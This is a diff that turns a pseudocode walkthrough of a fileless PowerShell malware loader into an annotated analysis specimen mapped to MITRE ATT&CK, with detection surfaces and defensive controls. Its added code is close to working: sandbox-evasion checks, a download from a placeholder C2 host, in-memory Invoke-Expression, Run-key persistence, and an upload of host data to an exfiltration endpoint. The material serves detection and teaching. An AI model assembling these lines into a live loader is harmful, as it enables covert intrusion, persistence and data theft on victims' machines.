@@ -1,253 +1,319 @@
-# =============================================================================
-# FILELESS MALWARE LOADER DEMO – SAFE PSEUDOCODE VERSION
-# =============================================================================
-# FILE NAME: fileless_demo_safe.txt
-# PURPOSE: Educational walk-through of fileless malware techniques.
-# MECHANISM: Describe how malware could operate *without actually running it*.
-# ANALYSIS: Static, non-executable pseudocode ONLY. DO NOT IMPLEMENT VERBATIM.
-# =============================================================================
+# FILELESS MALWARE DEMO | SAFE ANALYSIS SPECIMEN
+# Static review only. Non-executable. Behavior models are redacted.
+# MITRE ATT&CK: T1059.001, T1027, T1055, T1547.001, T1082, T1497, T1041
 
+================================================================================
 
-# =============================================================================
-# STAGE 1: ERROR SUPPRESSION & ENVIRONMENT PREP
-# =============================================================================
-# PURPOSE: Show how malware hides noisy errors and progress output.
-# MECHANISMS (CONCEPTUAL):
-#   - Suppress error messages so failed commands do not alert the user.
-#   - Hide download progress so network activity appears invisible.
-# LIMITATIONS:
-#   - Advanced logging / EDR can still observe failures and network calls.
-# =============================================================================
+[BOOTSTRAP]
 
-# PSEUDOCODE (BENIGN STYLE):
-#   set global_error_behavior to "silent"
-#   set download_progress_behavior to "silent"
+    $ErrorActionPreference = <silenced>
+    $ProgressPreference    = <silenced>
 
+OBJECTIVE: Silence PowerShell's built-in error reporting & progress output
+           before the loader begins any meaningful host interaction.
 
-# =============================================================================
-# STAGE 2: GATHER VICTIM INFO / ANTI-SANDBOX CHECKS
-# =============================================================================
-# PURPOSE: Collect basic host info and bail out if running in a lab / sandbox.
-# MECHANISMS:
-#   - Read environment variables for computer name and username.
-#   - Compare against a list of suspicious names (e.g., "SANDBOX", "VIRUS").
-#   - Check for artifacts of VMs and analysis tools.
-# LIMITATIONS:
-#   - Heuristics can be incomplete; real machines may look “sandbox-like”.
-# =============================================================================
+RATIONALE:
+- EDR (Endpoint Detection & Response) agents & security monitoring tools often
+  treat stderr output & progress stream activity as behavioral signals.
+- Silencing both removes a passive detection layer before the loader performs
+  any meaningful action, so the process tree appears idle rather than active.
 
-# MALICIOUS PSEUDOCODE (REDACED – DO NOT IMPLEMENT):
-#   computerName = read_environment_variable("COMPUTERNAME")
-#   userName     = read_environment_variable("USERNAME")
-#
-#   suspiciousComputerTokens = [
-#       "SANDBOX", "MALWARE", "VIRUS", "SAMPLE",
-#       "VBOX", "VMWARE"
-#   ]
-#
-#   suspiciousUserTokens = [
-#       "Analyst", "Admin", "Researcher", "User", "Sandbox"
-#   ]
-#
-#   # If host looks like a lab, terminate to avoid analysis:
-#   if computerName contains_any suspiciousComputerTokens:
-#       exit_program()
-#
-#   if userName contains_any suspiciousUserTokens:
-#       exit_program()
-#
-#   # Optional additional checks (conceptual only):
-#   #   - Look for VM drivers / “VMware Tools” / “VirtualBox Guest Additions”
-#   #   - Count CPU cores / RAM to spot tiny sandboxes
-#   #   - Detect running tools like Wireshark, ProcMon, IDA, Ghidra, etc.
+DETECTION SURFACE:
+- Interpreter launched with output suppression flags
+- No stderr/stdout visible in the data collected by monitoring tools
+  (telemetry: process output, file writes, network calls, registry changes)
+- Anomalous silence in child PowerShell process chain
+  (most legit sessions produce visible activity)
 
+ATT&CK: [ T1059.001 ] Command & Scripting Interpreter: PowerShell
 
-# =============================================================================
-# STAGE 3: COMMAND & CONTROL (C2) CONFIG
-# =============================================================================
-# PURPOSE: Define where the malware *would* talk to an attacker.
-# MECHANISMS:
-#   - Use a HTTPS URL that looks like normal web traffic.
-#   - Use a common browser User-Agent string to blend in.
-#   - Use Base64 text to hide binary payload contents in transit.
-# LIMITATIONS:
-#   - Network security tools can still flag suspicious destinations / patterns.
-# =============================================================================
+================================================================================
 
-# MALICIOUS PSEUDOCODE (REDACED – DO NOT IMPLEMENT):
-#   c2ServerUrl = "https://malicious-c2-server.example.com/payload"
-#   userAgent   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-#
-#   # Real malware would later:
-#   #   - Create an HTTP client object.
-#   #   - Set the "User-Agent" header to userAgent.
-#   #   - Contact c2ServerUrl over HTTPS to fetch encoded payload data.
+[ENV_AWARENESS]
 
+    $hostName = [Environment]::GetEnvironmentVariable(<COMPUTERNAME>)
+    $userName = [Environment]::GetEnvironmentVariable(<USERNAME>)
 
-# =============================================================================
-# STAGE 4: IN-MEMORY PAYLOAD DOWNLOAD (FILELESS ATTACK SETUP)
-# =============================================================================
-# PURPOSE: Retrieve the main malicious payload without writing a file to disk.
-# MECHANISMS:
-#   - Use built-in .NET / OS HTTP classes to download text over HTTPS.
-#   - Store the payload directly in memory (a string / byte array).
-# LIMITATIONS:
-#   - Network traffic is still observable.
-#   - Memory forensics can recover payload after the fact.
-# =============================================================================
+    $suspiciousHostTokens = @( <SANDBOX>, <MALWARE>, <VIRUS>, <VBOX>, <VMWARE> )
+    $suspiciousUserTokens = @( <Analyst>, <Admin>, <Researcher>, <Sandbox> )
 
-# MALICIOUS PSEUDOCODE (REDACED – DO NOT IMPLEMENT):
-#   try:
-#       httpClient = create_http_client()
-#       set_header(httpClient, "User-Agent", userAgent)
-#
-#       # Download payload as TEXT, not a file:
-#       encodedPayloadString = httpClient.download_text(c2ServerUrl)
-#
-#   catch any_error:
-#       # Fail silently to avoid user suspicion.
-#       silently_ignore_error()
-#       terminate_or_return()
+    if ($hostName -match $suspiciousHostTokens) { exit }
+    if ($userName -match $suspiciousUserTokens) { exit }
 
+OBJECTIVE: Fingerprint (collect identifying info about) the host machine
+           & abort execution if analysis infrastructure is detected.
 
-# =============================================================================
-# STAGE 5: PAYLOAD DECODING
-# =============================================================================
-# PURPOSE: Transform downloaded Base64 text into executable code representation.
-# MECHANISMS:
-#   - Decode Base64 string into raw bytes.
-#   - Interpret bytes as script / shellcode / secondary PowerShell.
-# LIMITATIONS:
-#   - Decoding routines can be signatured.
-#   - Memory scanners may flag decoded content.
-# =============================================================================
+RATIONALE:
+- If the loader runs inside a sandbox/analyst VM (analysis infrastructure):
+  1. payload gets captured
+  2. C2 endpoint gets blocklisted
+  3. whole campaign is compromised
+  4. attacker is forced to rebuild infrastructure from scratch
+- Aborting early on suspicious hosts is cheaper than losing the entire
+  operation to a single analysis run.
+- More advanced, real-world samples go further: enumerating VM artifacts
+  (e.g., VMware Tools), detecting analyst tools (e.g., Wireshark, Ghidra),
+  profiling hardware (e.g., low core count, low RAM), or timing checks
+  (call Sleep() for a known duration, then measure how much time actually
+   passed; sandboxes often fast-forward sleep calls).
 
-# MALICIOUS PSEUDOCODE (REDACED – DO NOT IMPLEMENT):
-#   decodedBytes   = base64_decode(encodedPayloadString)
-#   decodedPayload = interpret_bytes_as_text_or_code(decodedBytes)
+DETECTION SURFACE:
+- Environment variable enumeration at process start
+- String comparisons against known sandbox indicators
+- Rapid process exit with no output (abort branch triggered)
+- WMI queries for hardware profile data
 
+ATT&CK: [ T1082 ] System Information Discovery
+        [ T1497 ] Virtualization/Sandbox Evasion
 
-# =============================================================================
-# STAGE 6: IN-MEMORY EXECUTION (FILELESS ATTACK EXECUTION)
-# =============================================================================
-# PURPOSE: Execute the decoded payload from memory without creating a file.
-# MECHANISMS:
-#   - Feed decodedPayload into a script interpreter / JIT engine.
-#   - Often done via “evaluate this string as code” semantics.
-# LIMITATIONS:
-#   - Endpoint sensors often watch for “execute string as code” behavior.
-# =============================================================================
+================================================================================
 
-# MALICIOUS PSEUDOCODE (REDACED – DO NOT IMPLEMENT):
-#   execute_string_as_code(decodedPayload)
-#   # Example concept:
-#   #   interpreter.evaluate(decodedPayload)
-#   # In PowerShell, this behavior is similar to calling Invoke-Expression
-#   # on attacker-controlled content, which is a common red flag.
+[C2_PROFILE]
 
+    $c2Endpoint    = <https://[redacted].example.com/payload>
+    $exfilEndpoint = <https://[redacted].example.com/exfil>
+    $userAgent     = <Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...>
 
-# =============================================================================
-# STAGE 7: PERSISTENCE MECHANISM
-# =============================================================================
-# PURPOSE: Ensure code runs automatically whenever Windows starts.
-# COMMON MECHANISM DEMONSTRATED:
-#   - Use “Run” registry keys under the current user hive.
-#   - Point that key to a hidden PowerShell invocation of this loader.
-# LIMITATIONS:
-#   - Registry autorestart entries are widely monitored by defenders.
-#   - Fake “service-like” names are relatively easy to hunt for.
-# =============================================================================
+OBJECTIVE: Define the C2 (Command & Control) server endpoints & disguise
+           settings used to retrieve the payload & send stolen data back.
 
-# CONCEPTUAL CONFIG:
-#   persistRegistryPath  = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-#   persistEntryName     = "WindowsUpdater"   # Tries to look legit
-#   thisScriptPath       = "full\\path\\to\\fileless_loader.ps1"
-#
-# MALICIOUS PSEUDOCODE (REDACED – DO NOT IMPLEMENT):
-#   # Build a command that would secretly re-launch this loader at logon:
-#   startupCommand = (
-#       "powershell.exe with hidden window, relaxed execution policy, " +
-#       "and script file = thisScriptPath"
-#   )
-#
-#   # In real malware, the next step would be:
-#   #   create_or_update_registry_string(
-#   #       root = "current user",
-#   #       path = persistRegistryPath,
-#   #       name = persistEntryName,
-#   #       value = startupCommand
-#   #   )
-#   #
-#   # This demo only describes the behavior; it does NOT implement it.
+RATIONALE:
+- HTTPS traffic to external hosts is common enough that it rarely triggers
+  alerts on its own (it looks like normal web browsing to most tools).
+- A spoofed User-Agent string makes requests appear to come from a browser,
+  helping them pass through corporate proxy & firewall inspection unnoticed.
+- Delivering the payload as encoded text rather than a raw binary prevents
+  security tools from flagging an unexpected file download over what looks
+  like a normal HTTPS request.
 
+DETECTION SURFACE:
+- HTTPS connections from interpreter processes to non-CDN destinations
+- Spoofed/mismatched User-Agent strings in proxy logs
+- Hardcoded URLs recoverable via string extraction/memory forensics
+- DNS queries to recently registered/low-reputation domains
 
-# =============================================================================
-# STAGE 8: DATA THEFT (EXFILTRATION)
-# =============================================================================
-# PURPOSE: Steal basic system info and transmit it to attacker’s server.
-# MECHANISMS:
-#   - Collect system metadata (host name, user, domain, OS, architecture).
-#   - Serialize to JSON.
-#   - Encode JSON as Base64 and send via HTTP POST to C2.
-# LIMITATIONS:
-#   - Outbound web requests can be logged and correlated to suspicious hosts.
-#   - Limited demo scope; real malware steals much more sensitive data.
-# =============================================================================
+ATT&CK: [ T1071.001 ] Application Layer Protocol: Web Protocols
 
-# CONCEPTUAL CONFIG:
-#   exfilUrl = "https://malicious-c2-server.example.com/exfil"
-#
-# MALICIOUS PSEUDOCODE (REDACED – DO NOT IMPLEMENT):
-#   sysInfo = {
-#       "Computer"      : read_environment_variable("COMPUTERNAME"),
-#       "User"          : read_environment_variable("USERNAME"),
-#       "Domain"        : read_environment_variable("USERDOMAIN"),
-#       "OS"            : query_wmi("Win32_OperatingSystem.Caption"),
-#       "Architecture"  : read_environment_variable("PROCESSOR_ARCHITECTURE")
-#   }
-#
-#   jsonData     = serialize_to_json(sysInfo)
-#   encodedData  = base64_encode(utf8_bytes(jsonData))
-#
-#   httpClient   = create_http_client()
-#   httpClient.post_text(exfilUrl, encodedData)
+================================================================================
 
+[MEMORY_RETRIEVAL]
 
-# =============================================================================
-# END OF FILELESS LOADER DEMO (SAFE PSEUDOCODE)
-# =============================================================================
-# GHIDRA ANALYSIS POINTS (WHAT TO LOOK FOR IN BINARY / SCRIPT FORM):
-#   - Use of built-in HTTP clients (e.g., System.Net.WebClient or equivalents)
-#       => network communication to suspicious domains.
-#   - Base64 decode routines converting large blobs of text to bytes.
-#   - “Execute string as code” patterns (reflection / Invoke-Expression-like).
-#   - Registry modification around:
-#       HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-#   - WMI / OS queries for reconnaissance (e.g., OS caption, architecture).
-# =============================================================================
+    $client = New-Object <Net.WebClient>
+    $client.Headers.Add(<User-Agent>, $userAgent)
 
+    try {
+        $encodedPayload = $client.<DownloadString>($c2Endpoint)
+    }
+    catch {
+        exit   # SILENT FAILURE (NO OUTPUT/CRASH/ALERT)
+    }
 
-# =============================================================================
-# MITRE ATT&CK TECHNIQUES DEMONSTRATED (CONCEPTUALLY)
-# =============================================================================
-# [T1059.001] Command & Scripting Interpreter: PowerShell
-#   PURPOSE: Execute malicious commands / scripts via PowerShell-like interface.
-#
-# [T1027] Obfuscated Files or Information (Base64 Encoding)
-#   PURPOSE: Hide malicious payload content during download / exfiltration.
-#
-# [T1055] Process Injection / In-Memory Execution (Execute-String Behavior)
-#   PURPOSE: Run code directly from memory without creating disk artifacts.
-#
-# [T1547.001] Boot or Logon Autostart Execution: Registry Run Keys
-#   PURPOSE: Maintain persistence across user logons and system reboots.
-#
-# [T1082] System Information Discovery
-#   PURPOSE: Gather victim system details for attacker decision-making.
-#
-# [T1041] Exfiltration Over C2 Channel
-#   PURPOSE: Transmit stolen data over the same channel used for control.
-# =============================================================================
-# REFERENCE:
-#   MITRE Corporation. MITRE ATT&CK Matrix – https://attack.mitre.org/techniques/
-# =============================================================================
+OBJECTIVE: Download the payload from C2 directly into memory without
+           writing anything to disk.
+
+RATIONALE:
+- Antivirus engines maintain hash databases of known malicious files &
+  scan anything written to disk at write time.
+- A payload that never touches the file system never gets hashed, never
+  gets matched against a signature database, & leaves no artifact for
+  post-incident forensic review.
+- Storing the payload as a variable in memory bypasses this detection
+  layer entirely.
+
+DETECTION SURFACE:
+- WebClient/WebRequest instantiation from interpreter process
+- Outbound HTTPS from powershell.exe/wscript.exe/mshta.exe
+- Sysmon Event ID 3: network connection with no corresponding file write
+- Proxy logs: content-type mismatch (text/plain delivering encoded blob)
+
+HUNTING NOTE (CORRELATION): Interpreter launch → outbound HTTPS → no file
+                            write → Base64 decode activity
+                            (this chain = high-fidelity behavioral signal).
+
+ATT&CK: [ T1059.001 ] Command & Scripting Interpreter: PowerShell
+        [ T1027 ] Obfuscated Files or Information
+
+================================================================================
+
+[DECODE_STAGE]
+
+    $decodedBytes   = [Convert]::<FromBase64String>($encodedPayload)
+    $decodedPayload = [Text.Encoding]::Unicode.<GetString>($decodedBytes)
+
+OBJECTIVE: Decode the Base64-encoded payload retrieved from C2 into executable
+           logic, entirely within memory.
+RATIONALE:
+- Base64 requires no third-party libraries, no suspicious API imports, &
+  no custom decryption logic (the decode function is built directly into .NET,
+  so it blends in with normal runtime behavior).
+- This keeps the behavioral footprint small compared to encryption-based
+  obfuscation schemes (which introduce additional imports that analysts &
+  automated tools actively look for).
+- No disk write occurs at any point in this stage; the decoded payload exists
+  only as a variable in memory.
+
+DETECTION SURFACE:
+- FromBase64String calls on large input buffers
+- Memory regions marked executable shortly after decode
+- AMSI (Anti Malware Scan Interface) scans content before execution
+  (decoded payload may get flagged here even without a file on disk)
+- Decoded payload recoverable from heap via memory forensics before
+  garbage collection (GC) clears it
+
+ATT&CK: [ T1027 ] Obfuscated Files or Information
+
+================================================================================
+
+[RUNTIME_EXECUTION]
+
+    <Invoke-Expression> $decodedPayload     # MOST COMMON
+
+    OR (EQUIVALENTLY)
+
+    [ScriptBlock]::Create($decodedPayload).Invoke()     # LESS SIGNATURED
+
+OBJECTIVE: Execute the decoded payload directly from memory without any file
+           system interaction.
+
+RATIONALE:
+- Evaluating a string as code is the defining primitive of fileless execution
+  (payload never exists as a file, only as a transient string object in memory).
+- This evades any detection that relies on scanning files at rest
+  (since there is no file to scan).
+- On a default Windows install, neither Invoke-Expression nor
+  ScriptBlock::Create are logged, making this stage invisible without
+  additional security tooling in place.
+
+DETECTION SURFACE:
+- Invoke-Expression/IEX called on non-trivial string content
+- ScriptBlock logging Event ID 4104: full payload captured in plaintext
+- AMSI hook: payload submitted for inspection at decode→execute boundary
+- Parent/child anomaly: unexpected child processes spawned by powershell.exe
+- Constrained Language Mode (CLM) violation if policy is enforced
+
+HUNTING NOTE (HIGHEST VALUE): ScriptBlock logging (Event ID 4104) captures
+                              the decoded payload in plaintext regardless of
+                              how it was obfuscated upstream (works even if
+                              Base64/other encoding was used to hide it).
+
+ATT&CK: [ T1059.001 ] Command & Scripting Interpreter: PowerShell
+        [ T1055 ] Process Injection / In-Memory Execution
+
+================================================================================
+
+[PERSISTENCE]
+
+    $regPath   = <HKCU:\Software\Microsoft\Windows\CurrentVersion\Run>
+    $entryName = <WindowsUpdateService>
+    $loaderCmd = "powershell.exe <-WindowStyle Hidden> <-ExecutionPolicy Bypass>
+                  <-File> <$loaderPath>"
+
+    # BEHAVIOR DESCRIBED ONLY, WRITE OPERATION NOT PRESENT:
+    New-ItemProperty -Path $regPath -Name $entryName -Value $loaderCmd
+
+OBJECTIVE: Establish a logon-triggered autostart entry so the loader
+           survives reboots without needing to be re-delivered.
+
+RATIONALE:
+- Registry Run keys under HKCU (current user section) require no admin
+  privileges to write (standard user access is sufficient).
+- This matters for phishing-delivered loaders, which typically run in
+  the context of a normal user account with no elevated permissions.
+- The entry name is chosen to resemble a legitimate Windows background
+  service, reducing the chance a user or analyst notices it during a
+  manual review.
+
+DETECTION SURFACE:
+- Registry write to CurrentVersion\Run (Sysmon Event ID 13)
+- powershell.exe with -WindowStyle Hidden in autostart value
+- Autoruns/persistence hunting tooling flags new Run entries
+- Entry name mimicking legitimate services (typosquatting pattern)
+
+ATT&CK: [ T1547.001 ] Boot or Logon Autostart Execution: Registry Run Keys
+
+================================================================================
+
+[COLLECTION_EXFIL]
+
+    $sysInfo = @{
+        Hostname     = [Environment]::GetEnvironmentVariable(<COMPUTERNAME>)
+        Username     = [Environment]::GetEnvironmentVariable(<USERNAME>)
+        Domain       = [Environment]::GetEnvironmentVariable(<USERDOMAIN>)
+        OS           = <(Get-WmiObject Win32_OperatingSystem).Caption>
+        Architecture = [Environment]::GetEnvironmentVariable(<PROCESSOR_ARCHITECTURE>)
+    }
+
+    $jsonBlob    = <ConvertTo-Json> $sysInfo
+    $encodedBlob = [Convert]::<ToBase64String>([Text.Encoding]::UTF8.<GetBytes>($jsonBlob))
+
+    $client = New-Object <Net.WebClient>
+    $client.<UploadString>($exfilEndpoint, $encodedBlob)
+
+OBJECTIVE: Collect basic system metadata & transmit it back to the
+           attacker over the established C2 channel.
+
+RATIONALE:
+- The first exfil pass is intentionally lightweight; the attacker uses
+  this metadata to decide whether the machine is worth deploying
+  additional tooling against (ransomware, lateral movement frameworks,
+  keyloggers, credential harvesters, etc.).
+- Domain membership, hostname, & OS edition together reveal target value:
+  - a domain-joined machine hostname (e.g., DC01, EXEC, SQL) gets escalated;
+  - a standalone Windows Home PC with an auto-generated hostname gets abandoned.
+- The data is serialized to JSON & Base64-encoded so it can be transmitted
+  safely as plaintext in an HTTP POST body
+  (no binary transfer, no suspicious content-type).
+
+DETECTION SURFACE:
+- WMI query for Win32_OperatingSystem (Sysmon Event ID 20)
+- Outbound HTTP POST from interpreter process
+- POST body containing Base64-encoded JSON to external destination
+- Payload volume (~200 bytes) inconsistent with legitimate web traffic
+
+ATT&CK: [ T1082 ] System Information Discovery
+        [ T1041 ] Exfiltration Over C2 Channel
+        [ T1027 ] Obfuscated Files or Information
+
+================================================================================
+
+[ANALYST_NOTES]
+
+REVERSE ENGINEERING INDICATORS:
+- IMPORTS TO FLAG:
+  - Net.WebClient / System.Net.HttpClient   → network communication
+  - Convert::FromBase64String               → payload decoding
+  - Text.Encoding::Unicode / UTF8           → string reconstruction
+  - Microsoft.Win32.Registry                → persistence writes
+  - Get-WmiObject / WMI                     → host reconnaissance
+- STRING ARTIFACTS:
+  - encoded C2 URLs (Base64 or XOR'd)
+  - spoofed User-Agent substrings
+  - registry key paths under CurrentVersion\Run
+  - WMI class names: Win32_OperatingSystem, Win32_ComputerSystem
+- BEHAVIORAL CHAIN:
+  - interpreter → outbound HTTPS → no file write → Base64 decode → IEX
+  - short-lived process, no output           → sandbox abort branch
+  - registry write at session end            → persistence installed
+- MEMORY FORENSICS:
+  - decoded payload recoverable from heap before garbage collection (GC)
+  - HTTP response buffer may persist in memory after download
+  - Volatility: cmdline, malfind, netscan for corroboration
+
+DEFENSIVE CONTROLS (PRIORITY ORDER):
+1. ScriptBlock Logging (Event ID 4104)
+   - Captures decoded payload in plaintext regardless of upstream obfuscation.
+   - Highest-value single control against this class.
+2. AMSI Integration
+   - Intercepts content at the decode→execute boundary.
+   - Effective against known payload signatures.
+3. Constrained Language Mode / WDAC / AppLocker
+   - Eliminates IEX & ScriptBlock::Create as execution primitives.
+   - Blocks this technique class entirely if enforced.
+4. Egress Filtering + TLS Inspection
+   - Breaks memory retrieval if C2 is unreachable.
+   - TLS inspection required to inspect HTTPS payload content.
+5. Registry Persistence Monitoring (Sysmon Event ID 13)
+   - Detects autostart writes at install time.
+   - Autoruns baseline comparison effective for hunting.
+
+# REFERENCE: MITRE Corporation (https://attack.mitre.org/techniques/)
